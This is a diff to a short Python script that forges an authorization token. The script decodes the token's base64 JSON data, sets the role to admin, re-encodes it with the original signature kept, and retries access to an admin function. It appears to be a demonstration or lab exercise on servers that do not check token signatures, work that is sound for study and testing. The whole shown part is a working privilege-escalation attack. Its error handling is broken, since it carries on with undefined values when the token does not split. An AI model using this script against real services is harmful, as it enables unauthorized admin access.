@@ -12,17 +12,24 @@ def main():
     elif len(sys.argv) > 2:
         print('Ignoring additional arguments.')
 
-    incoming_token = sys.argv[1]
-    user_data = json.loads(base64.b64decode(incoming_token).decode())
+    full_token = sys.argv[1]
+
+    try:
+        encoded_data, signature = full_token.split('.')
+    except ValueError as e:
+        print(f'We need the full token (data . signature). Error: {e}')
+
+    user_data = json.loads(base64.b64decode(encoded_data).decode())
 
     print(f'\nFor user {user_data.get('user_name')}:')
-    try_access_admin(incoming_token)
+    try_access_admin(full_token)
 
     print(f'\n\nModifying data:\n{user_data}')
     user_data.update({'role':'admin'})
 
     print(f'\nNew user data.\n{user_data}')
-    new_token = base64.b64encode(json.dumps(user_data).encode()).decode('utf-8')
+    new_encoded_data = base64.b64encode(json.dumps(user_data).encode()).decode('utf-8')
+    new_token = f'{new_encoded_data}.{signature}'
     print(f'\nNew autherization token.\n{new_token}\n\n')
 
     print(f'Retrying with new token. . .')
@@ -44,7 +51,7 @@ def try_access_admin(authToken):
         print(f'try_access_admin: Error: {e}')
 
     # we see if the server authorized us as admin
-    print(f'Server has responded. Admin = {data.get('is_elevated')}')
+    print(f'Server has responded. {data}')
 
 
 if __name__ == "__main__":
